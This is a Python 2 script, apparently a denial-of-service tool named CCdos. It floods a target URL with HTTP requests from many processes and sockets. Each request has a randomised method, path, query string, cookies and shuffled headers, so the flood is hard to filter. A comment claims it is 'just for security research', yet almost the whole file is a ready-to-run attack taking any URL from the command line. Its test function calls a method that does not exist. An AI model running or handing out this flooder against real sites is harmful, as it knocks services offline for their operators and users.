#!/usr/bin/python
# -*- coding: utf-8 -*-

# Just for security research,
# Tested on Linux / OSX

import sys
import random
import urlparse
import urllib
import httplib
import multiprocessing

from optparse import OptionError
from optparse import OptionParser


class CCdos(multiprocessing.Process):
    def __init__(self, url, nsocks=1):
        super(CCdos, self).__init__()

        parser = urlparse.urlparse(url)
        self.url = parser.geturl()
        self.host = parser.hostname
        self.port = parser.port
        self.path = parser.path
        # self.params = parser.params
        self.query = parser.query

        self.nsocks = nsocks  # number of socks
        self.csocks = []      # clients socks
        self.timeout = 30

        self.minlen = 0
        self.maxlen = 160

    def run(self):
        for i in range(self.nsocks):
            client, result = self.one()
            if client:
                self.csocks.append(client)

        for csock in self.csocks:
            csock.getresponse()

    def one(self):
        try:
            print("In process name: %s - pid: %d" % (self.name, self.pid))
            client = None
            result = {}
            result['url'] = self.url
            result['exception'] = None

            client = self.send_http_request(self.host, self.port,
                                            self.path, self.query,
                                            sep=['?', ':'],
                                            method=['GET',
                                                    'POST',
                                                    'PUT',
                                                    'RANDOM'],
                                            ssl=False)
        except Exception as err:
            result['exception'] = err
        return client, result

    def random_string(self, length):
        lowercase = range(0x61, 0x7A)
        uppercase = range(0x41, 0x5A)
        number = range(0x30, 0x39)

        chars_range = lowercase + uppercase + number
        chars = [chr(random.choice(chars_range)) for i in range(0, length)]
        return "".join(chars)

    def random_num(self):
        return random.randint(self.minlen, self.maxlen)

    def random_one_from_list(self, lst):
        return [lst[random.randint(0, len(lst) - 1)]]

    def random_req_method(self, methods=['GET', 'POST', 'OPTIONS', 'PUT']):
        _method = ''
        if 'RANDOM' in methods:
            _method = self.random_string(self.random_num())
        else:
            _method = self.random_one_from_list(methods)[0]
        return _method

    def random_req_useragent(self, useragents=['Mozilla/5.0']):
        _useragent = ''
        if 'RANDOM' in useragents:
            _useragent = self.random_string(self.random_num())
        else:
            _useragent = self.random_one_from_list(useragents)[0]
        return _useragent

    def random_uri_path(self, path=None):
        return path if path else self.random_string(self.random_num())

    def random_uri_sep(self, sep=['?']):
        # http://demo.com/?id=123&name=asd
        # ? ---- uri seperator
        return self.random_one_from_list(sep)[0]

    def random_uri_query(self, query=None):
        # http://stackoverflow.com/questions/10113090/best-way-to-parse-a-url-query-string
        # http://stackoverflow.com/questions/1233539/python-dictionary-to-url-parameters
        parts = {}
        if query:
            parts = urlparse.parse_qs(query)
            # parts = urlparse.parse_qsl(query)

            # random keys (nesscessary ?)
            # random values
            for key in parts.keys():
                value = self.random_string(self.random_num())
                parts[key] = [value]

        else:
            for i in range(1, 20):
                key = self.random_string(self.random_num())
                value = self.random_string(self.random_num())
                parts[key] = value

        return urllib.urlencode(parts)

    def random_uri_cookies(self, cookies=None):
        cookies = self.random_uri_query(query=cookies)
        cookies = cookies.replace('&', ';')
        return cookies

    def generate_req_uri(self, path=None, query=None, sep=['?', ':']):
        # scheme:[//[user:password@]host[:port]][/]path[?query][#fragment]
        rand_path = self.random_uri_path(path)
        rand_sep = self.random_uri_sep(sep=sep)
        rand_query = self.random_uri_query(query)

        return "%s%s%s" % (rand_path, rand_sep, rand_query)

    def generate_req_headers(self, vhost, useragents=['Mozilla/5.0']):
        # random Cache-Control directives
        cache_directives = ['no-cache', 'no-store', 'max-age=0']
        cache_control = ', '.join(self.random_one_from_list(cache_directives))

        # random Accept-Encoding directives
        accept_encoding_directives = ["''", '*', 'identity', 'gzip', 'deflate']
        accept_encoding = ', '.join(self.random_one_from_list(
            accept_encoding_directives))

        # random Accept-Charset directives
        accept_charset_directives = ['ISO-8859-1', 'utf-8', 'Windows-1251',
                                     'ISO-8859-2', 'ISO-8859-15']
        charset_lst = [self.random_one_from_list(accept_charset_directives)
                       for i in range(4)]
        accept_charset = '%s,%s;q=%s,*;q=%s' % (
            charset_lst[0][0],
            charset_lst[1][0],
            charset_lst[2][0],
            charset_lst[3][0])

        # random Referer directives
        refs = [
            'http://www.google.com/',
            'http://www.yahoo.com/',
            'http://www.bing.com/',
            'http://www.baidu.com/',
            'http://www.yandex.com/',
            self.url
        ]
        random_referer = self.random_one_from_list(refs)[0]
        random_querystr = self.random_string(self.random_num())
        referer = "%s?%s" % (random_referer, random_querystr)

        # random Content-Type directives
        content_type_directives = ['multipart/form-data',
                                   'application/x-url-encoded']
        content_type = self.random_one_from_list(content_type_directives)[0]

        headers = {
            'User-Agent': self.random_req_useragent(useragents=useragents),
            'Cache-Control': cache_control,
            'Accept-Encoding': accept_encoding,
            'Connection': 'keep-alive',
            'Keep-Alive': random.randint(1, 1000),
            'Accept-Charset': accept_charset,
            'Content-Type': content_type,
            'Referer': referer,
            'Cookie': self.random_uri_cookies(),
            'Host': vhost
        }

        # shuffle headers
        _headers = {}
        random.shuffle(headers.keys())
        for key in headers.keys():
            _headers[key] = headers[key]
        return _headers

    def send_http_request(self, host, port, path, query, sep=['?', ':'],
                          method=['GET', 'POST', 'OPTIONS', 'PUT'],
                          useragents=['Mozilla/5.0'],
                          ssl=False):
        client = None
        if ssl:
            port = port if port else 443
            client = httplib.HTTPSConnection(host, port, timeout=self.timeout)
        else:
            port = port if port else 80
            client = httplib.HTTPConnection(host, port, timeout=self.timeout)

        req_method = self.random_req_method(method)
        req_headers = self.generate_req_headers(host, useragents=useragents)
        req_uri = self.generate_req_uri(path=path, query=query, sep=sep)

        print("[*] attack - %s %s:%s" % (req_method, host, port))
        client.request(req_method, req_uri, None, req_headers)
        # res = client.getresponse()
        return client


def usage():
    usage = "python %prog [options]"

    parser = OptionParser(usage=usage)

    try:
        parser.add_option('-u', '--url', dest='url', type='str',
                          help='a url to be attacked')

        parser.add_option('-p', '--procs', dest='procs', type='int',
                          default=10,
                          help='number of concurrent processes'),
        parser.add_option('-s', '--socks', dest='socks', type='int',
                          default=10,
                          help='number of consurrent sockets')
        (args, _) = parser.parse_args()
    except (OptionError, TypeError) as e:
        parser.error(e)
    else:
        return args


def test():
    cc = CCdos('http://www.demo.com/?cat=10')
    print(cc.random_string(10))
    print(cc.random_num())
    print(cc.random_one_from_list([1, 2, 3, 4, 5, 6]))
    print(cc.random_req_method(['RANDOM']))
    print(cc.random_req_method(['GET', 'POST', 'OPTIONS', 'PUT']))
    print(cc.random_req_useragent(['RANDOM']))

    print(cc.random_uri_path())
    print(cc.random_uri_sep())
    print(cc.random_uri_query())

    print(cc.random_uri_cookies())
    print(cc.generate_req_headers('www.exploit-db.com'))
    print cc.once()


if __name__ == "__main__":
    options = usage()

    if not options.url:
        print('Please -h for more details')
        sys.exit(0)

    jobs = []

    for i in range(options.procs):
        cc = CCdos(options.url, options.socks)
        jobs.append(cc)
        cc.start()

    for j in jobs:
        j.join()
